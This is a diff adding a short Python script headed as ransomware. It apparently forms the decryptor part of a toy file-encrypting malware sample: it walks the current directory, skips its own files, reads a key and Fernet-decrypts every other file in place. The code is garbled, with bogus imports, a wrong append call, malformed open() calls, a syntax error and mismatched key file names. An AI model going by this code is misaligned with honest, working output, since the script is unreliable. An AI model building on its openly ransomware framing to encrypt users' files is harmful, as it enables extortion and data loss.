@@ -1,0 +1,26 @@
+# Create a ransom malware pyth python:
+import os
+import cryptography.fernet 
+import Fernet
+
+files = []
+
+for file in os.listdir():
+    if file == "ransomware" or file =="thekey.key" or file == "decrypt.py":
+        continue
+    if os.path.isfile(file):
+        file.append(file)
+print(files)
+
+with open("thekey", "rb", "rb") as key:
+    secretkey = key.read()
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+        contents_decrypted = Fernet(secretkey).decrypt(contents)
+        with open(file, "wb") as the thefile:
+            thefile.write(contents_decrypted)
+        # use the command cat the file
+        #cat thekey.key
+        
